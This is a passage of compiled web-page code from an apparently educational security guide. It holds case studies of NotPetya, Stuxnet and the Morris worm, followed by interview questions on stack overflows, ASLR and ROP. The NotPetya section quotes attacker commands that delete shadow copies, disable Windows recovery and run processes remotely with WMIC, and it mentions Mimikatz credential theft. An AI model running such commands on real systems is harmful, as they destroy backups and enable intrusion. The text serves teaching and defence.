    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A bomb disguised as a kidnapping. The attackers demanded a ransom, but even if you paid, there was no key. NotPetya looked like ransomware but was designed to permanently destroy data."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Type:"
      }), " Destructive wiper disguised as ransomware"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Timeline:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Date"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Event"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Jun 18, 2017"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ME Doc accounting software update server compromised"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Jun 27, 2017"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Trojanized ME Doc update pushed; NotPetya activates"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Jun 27-28, 2017"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Spreads globally via EternalBlue, WMI, PsExec"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Jul 5, 2017"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Analysis confirms NotPetya is a wiper (not decryptable)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Technical Breakdown:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Initial Vector → ME Doc Supply Chain:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attackers compromised the ME Doc update server (Ukraine)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Signed digital certificate used to sign the trojanized update"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "ME Doc had automatic updates → installation was instant and trusted"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation (Lateral Movement):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "EternalBlue (SMBv1 exploit):"
        }), " Same exploit used by WannaCry, patched by MS17-010"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "WMIC:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "wmic /node:TARGET process call create \"cmd.exe /c ...\""
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "PsExec:"
        }), " Remote command execution via ADMIN$"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Credential theft:"
        }), " Used ", (0,jsx_runtime.jsx)(_components.code, {
          children: "Mimikatz"
        }), " to extract credentials from lsass"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Technical Details:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Modified version of ", (0,jsx_runtime.jsx)(_components.code, {
          children: "Mimikatz"
        }), " embedded in binary"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Encrypted MFT (Master File Table) with Salsa20"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Encrypted files with custom XOR + RSA-2048"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Overwrote MBR with custom bootloader displaying ransom note"
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Killed VMs: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "vssadmin.exe delete shadows /all /quiet"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Disabled Windows recovery: ", (0,jsx_runtime.jsx)(_components.code, {
          children: "bcdedit /set {default} recoveryenabled No"
        })]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Impact:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "$10B+ total damages"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Maersk (global shipping): $1.4B damage, 49,000+ computers wiped"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Replaced all 4,000 servers, 45,000 PCs, 2,500 applications in 10 days"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Merck (pharma): $870M damage, halted vaccine production"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "FedEx subsidiary TNT Express: $300M damage"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Total losses: >$10B (most damaging cyberattack at the time)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Why It Was a Wiper (Not Ransomware):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Payment mechanism was broken: email provider was taken down"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Encryption was flawed: private key was hashed from system info"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Even paying couldn't decrypt → the goal was destruction"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Lessons:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Supply chain attacks bypass traditional perimeter"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "EternalBlue exploit highlights importance of patch management"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Network segmentation slows lateral movement"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Offline backups: Maersk recovered from a single backup in an offline DC"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "93-stuxnet-2010--from-a-code-perspective",
      children: "9.3 Stuxnet (2010) → From a Code Perspective"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A guided missile that traveled through multiple locked doors, disguised itself as maintenance staff, and sabotaged a specific factory machine without the factory manager ever knowing."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Type:"
      }), " Cyber-weapon (worm targeting industrial control systems)"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Discovery:"
      }), " June 2010, VirusBlokAda (Belarusian security firm)"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Technical Breakdown (Code Perspective):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Entry Vectors:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "USB .lnk Exploit (MS10-046):"
        }), " Automatically executed when USB drive was browsed in Explorer. The ", (0,jsx_runtime.jsx)(_components.code, {
          children: "%LNK%"
        }), " file triggered code execution via a crafted shortcut icon resource."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Print Spooler Exploit (MS10-061):"
        }), " Escalated privilege via print spooler vulnerability."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Propagation:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MS10-073 (Win32k.sys):"
        }), " Kernel-level privilege escalation"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MS10-092 (Task Scheduler):"
        }), " Escalated from user to SYSTEM"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SMB/RPC:"
        }), " Spread within local network"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Peer-to-peer:"
        }), " Infected machines could update each other"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Stepstone:"
        }), " Used Siemens Step 7 project files as propagation vector via ", (0,jsx_runtime.jsx)(_components.code, {
          children: "s7otbxdx.dll"
        }), " hijack"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Payload (PLC Rootkit):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Replaced ", (0,jsx_runtime.jsx)(_components.code, {
          children: "s7otbxdx.dll"
        }), " (Siemens Step 7 communication DLL) with a malicious version"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Hooked read/write commands to/from Siemens S7-315 and S7-417 PLCs"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Intercepted and modified output to frequency converters (believed to be IR-1 uranium centrifuges)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Recorded normal operation, then played it back while spinning centrifuges outside safe speeds"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Hid modifications from monitoring software (PLC rootkit)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Code Facts:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "15,000+ lines of code across multiple components"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Multiple programming languages: C++, C, assembly"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Used valid digital certificates (RealTek, JMicron) → stolen from Taiwanese hardware companies"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Four zero-day exploits (MS10-046, MS10-061, MS10-073, MS10-092)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Two stolen certificates"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Peer-to-peer update mechanism (unusual for worms at the time)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Impact:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Destroyed ~1,000 IR-1 centrifuges at Natanz, Iran"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Set back Iranian nuclear program by ~2 years"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "First known cyberattack to cause physical destruction"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Changed cyberwarfare forever"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Code Example (Simplified):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "// Simplified concept of s7otbxdx.dll hook\n// This is NOT original Stuxnet code but demonstrates the technique\n\n// Original function pointer\ntypedef int (*ReadS7Block)(int blockNum, void *buffer);\nReadS7Block original_read = NULL;\n\n// Malicious hook\nint hooked_ReadS7Block(int blockNum, void *buffer) {\n    int result = original_read(blockNum, buffer);\n\n    // If this is a centrifuge speed read, report normal RPM\n    if (blockNum == CENTRIFUGE_BLOCK) {\n        // At this point, the actual RPM is dangerously high\n        // But we return fabricated normal values\n        CentrifugeData *data = (CentrifugeData *)buffer;\n        data->rpm = NORMAL_RPM;        // Report 63,000 RPM instead of 84,000\n        data->vibration = NORMAL_VIB;   // Report normal vibration\n        data->temperature = NORMAL_TEMP;\n    }\n    return result;\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Lessons:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Air-gapped networks can be breached via USB"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Four zero-days in a single weapon was unprecedented"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Physical consequences of cyberattacks are real"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Stolen code-signing certificates undermine trust"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "94-morris-worm-1988--first-internet-worm",
      children: "9.4 Morris Worm (1988) → First Internet Worm"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A biologist released a test population of bugs to study their spread, but the bugs reproduced so fast they choked the entire forest."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Type:"
      }), " Worm (self-propagating)"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Author:"
      }), " Robert Tappan Morris, Cornell graduate student"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Timeline:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Date"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Event"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Nov 2, 1988"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Worm released from MIT (to hide Cornell origin)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Nov 2-3, 1988"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Worm rapidly infects ~6,000 UNIX systems (10% of internet)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Nov 3, 1988"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MIT and UC Berkeley teams begin reverse-engineering"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Nov 4, 1988"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Decompiled and shared; kill procedures developed"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1990"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Morris convicted under Computer Fraud and Abuse Act"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1991"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sentenced: 3 years probation, 400 hours community service, $10,050 fine"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Technical Breakdown:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Vulnerabilities Exploited:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "fingerd buffer overflow (CVE-1999-0197):"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "fingerd"
            }), " (Finger service daemon) read 512 bytes from ", (0,jsx_runtime.jsx)(_components.code, {
              children: "gets()"
            }), " into a fixed buffer"]
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Worm sent a crafted 536-byte input that overflowed 512-byte buffer"
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["Overflow overwrote return address to execute ", (0,jsx_runtime.jsx)(_components.code, {
              children: "execve(\"/bin/sh\", ...)"
            })]
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "sendmail DEBUG command:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Sendmail SMTP daemon had a DEBUG mode enabled by default"
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["Worm connected via SMTP, sent ", (0,jsx_runtime.jsx)(_components.code, {
              children: "DEBUG"
            }), " command, then executed shell commands"]
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "rsh/rexec password guessing:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Tried weak passwords: \"guest\", \"root\", \"anonymous\", \"demo\", \"administrator\""
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: ["Used ", (0,jsx_runtime.jsx)(_components.code, {
              children: "/etc/passwd"
            }), " (no shadow at the time) for username list"]
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Tried 50 common passwords against each account"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Code Facts:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "~4,000 lines of code (99 lines in C, rest in supporting files)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Compiled on VAX and Sun 3 architectures"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Designed to stay hidden but had a bug: the \"1-in-7\" infection check was inverted"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Intended to replicate slowly (check if already infected every 7th time)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Bug: actually replicated on every opportunity except every 7th"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "The Replication Bug:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "// Simplified illustration of Morris Worm's infection check flaw\nint should_infect() {\n    // INTENDED: infect only 1 in 7 times (check r == 0)\n    // BUGGY: r returns 0-6 inclusive\n    int r = random() % 7;\n    // INTENDED: if (r == 0) return 1;   // infect 1/7 of the time\n    // ACTUAL:   if (r == 0) return 0;   // DON'T infect 1/7 of the time\n    // Effect: infected 6/7 of the time instead of 1/7\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Impact:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "6,000 of ~60,000 internet-connected systems infected (10%)"
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Estimated ", (0,jsx_runtime.jsxs)(_components.span, {
          className: "katex",
          children: [(0,jsx_runtime.jsx)(_components.span, {
            className: "katex-mathml",
            children: (0,jsx_runtime.jsx)(_components.math, {
              xmlns: "http://www.w3.org/1998/Math/MathML",
              children: (0,jsx_runtime.jsxs)(_components.semantics, {
                children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                  children: [(0,jsx_runtime.jsx)(_components.mn, {
                    children: "100"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "K"
                  }), (0,jsx_runtime.jsx)(_components.mo, {
                    children: "−"
                  })]
                }), (0,jsx_runtime.jsx)(_components.annotation, {
                  encoding: "application/x-tex",
                  children: "100K-"
                })]
              })
            })
          }), (0,jsx_runtime.jsx)(_components.span, {
            className: "katex-html",
            "aria-hidden": "true",
            children: (0,jsx_runtime.jsxs)(_components.span, {
              className: "base",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "strut",
                style: {
                  height: "0.7667em",
                  verticalAlign: "-0.0833em"
                }
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord",
                children: "100"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.0715em"
                },
                children: "K"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord",
                children: "−"
              })]
            })
          })]
        }), "10M in damages (system downtime, cleanup)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Led to:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Creation of CERT/CC (Computer Emergency Response Team Coordination Center)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "First conviction under CFAA"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Major push for network security research"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Birth of \"ethical hacking\" discourse"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "The fingerd Buffer Overflow (in C):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "// fingerd → simplified vulnerable code\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid process_request() {\n    char query[512];       // fixed-size buffer\n    gets(query);            // reads from stdin into buffer → NO BOUNDS CHECK\n    // ... process finger query ...\n}\n\nint main() {\n    // ...\n    process_request();\n    // ...\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Lessons:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["A single unchecked ", (0,jsx_runtime.jsx)(_components.code, {
          children: "gets()"
        }), " brought down 10% of the internet"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Bugs in attack code amplified damage (ironic)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Network resilience requires segmentation"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "The worm created the modern field of computer security incident response"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-10-interview-corner",
      children: "Section 10: Interview Corner"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q1-what-is-a-stack-buffer-overflow-explain-with-stack-frame-layout",
      children: "Q1: What is a stack buffer overflow? Explain with stack frame layout."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " A stack buffer overflow occurs when a program writes more data to a stack-allocated buffer than its allocated size, overwriting adjacent stack memory → specifically the saved base pointer and return address."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Stack frame layout during a function call:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "High Address\n+---------------------------+\n| function arguments        | ← caller pushes right-to-left\n+---------------------------+\n| return address            | ← pushed by CALL instruction\n+---------------------------+\n| saved base pointer (EBP)  | ← pushed by function prologue\n+---------------------------+\n| local variables (buffer)  | ← allocated by `sub esp, N`\n+---------------------------+\nLow Address (ESP points here)\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: ["When the buffer overflows, data spills from \"local variables\" up through saved EBP and return address. When the function executes ", (0,jsx_runtime.jsx)(_components.code, {
        children: "ret"
      }), ", it jumps to the overwritten address → attacker-controlled."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q2-how-does-aslr-work-and-how-can-it-be-bypassed",
      children: "Q2: How does ASLR work and how can it be bypassed?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " ASLR (Address Space Layout Randomization) randomizes the base addresses of stack, heap, shared libraries (libc), and the executable itself (PIE) at process startup. On 64-bit Linux, libc base has ~28 bits of entropy (256 possible positions on 32-bit)."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Bypass techniques:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Info leak (most common):"
        }), " Format string vulnerability (", (0,jsx_runtime.jsx)(_components.code, {
          children: "printf(user_input)"
        }), ") reads stack values including return addresses, allowing ASLR base calculation."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "ret2plt:"
        }), " Use the binary's PLT (address known if no PIE) to call ", (0,jsx_runtime.jsx)(_components.code, {
          children: "puts()"
        }), " and leak a GOT entry containing a resolved libc address."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Brute-force (32-bit only):"
        }), " Try all possible addresses (~2^16 possibilities)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Partial overwrite:"
        }), " Modify only the lower bytes of a return address to jump to a different function within the same page (ASLR doesn't randomize within pages)."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q3-explain-the-difference-between-depnx-and-how-to-bypass-it",
      children: "Q3: Explain the difference between DEP/NX and how to bypass it."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "A:"
      }), " DEP (Data Execution Prevention) / NX (No-Execute) is a hardware feature that marks memory pages as non-executable. The stack and heap are marked NX, so injected shellcode cannot execute there."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Bypass: ROP (Return-Oriented Programming)."
      }), " Instead of injecting new code, chain short instruction sequences (gadgets) that already exist in executable memory (libc, binary itself). Each gadget ends with ", (0,jsx_runtime.jsx)(_components.code, {
        children: "ret"
      }), ", which pops the next gadget's address from the (attacker-controlled) stack."]
